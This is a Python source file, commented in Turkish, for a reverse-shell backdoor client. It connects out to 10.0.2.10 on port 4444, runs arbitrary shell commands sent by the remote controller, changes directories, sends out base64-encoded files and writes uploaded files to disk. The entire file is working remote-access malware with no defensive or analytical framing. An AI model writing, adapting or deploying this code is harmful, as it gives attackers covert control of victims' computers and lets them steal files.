import socket
import subprocess
import simplejson
import os
import base64

class MySocket:
	def __init__(self,ip,port):
		# hangi ag ailesi ile calisacagiz ve hangi yolla veriler transfer edilecek
		self.my_connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		# baglanti icin port ve ip adres tanimlanmali
		self.my_connection.connect((ip,port))		

	def command_execution(self,command):
		return subprocess.check_output(command, shell=True)

	def json_send(self ,data):
		json_data = simplejson.dumps(data)
		self.my_connection.send(json_data).encode("utf-8")

	def json_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.my_connection.recv(1024).decode("utf-8")
				return simplejson.loads(json_data)
			except ValueError:
				continue
	def execute_cd_command(self,directory):
		# cd --> change directory komutunu uygulayabiliriz
		os.chdir(directory)
		return "Cd to " + directory

	def get_file_contents(self,path):
		# rb binary dosya okuma modu
		with open(path,"rb") as my_file:
			#jpeg dosyasini acabilmek icin duzenleme yapacagiz.
			return base64.b64encode(my_file.read())

	def save_file(self,path,content):
		with open(path,"wb") as my_file:
			my_file.write(base64.b64decode(content))
			return "Download OK"

	def start_socket(self):
		# gelen baglantiyi dinlemek icin komut olusturduk, receive fonk cagirdik
		# gelen baglantida hedef bilgisayara terminalden ulasabiliriz, ipconfig ,dir vs.. komutlari calistirilabilir
		while True:
			command = self.json_receive()
			try:
				if command[0] == "quit":
					self.my_connection.close()
					exit()
				elif command[0] == "cd" and len(command) > 1:
					command_output = self.execute_cd_command(command[1])
				elif command[0] == "download":
					command_output = self.get_file_contents(command[1])
				elif command[0] == "upload":
					command_output = self.save_file(command[1],command[2])
				else:
					command_output = self.command_execution(command)
			except Exception:
				command_output = "Error !"
			self.json_send(command_output)
		self.my_connection.close()
my_socket_object = MySocket("10.0.2.10",4444)
my_socket_object.start_socket()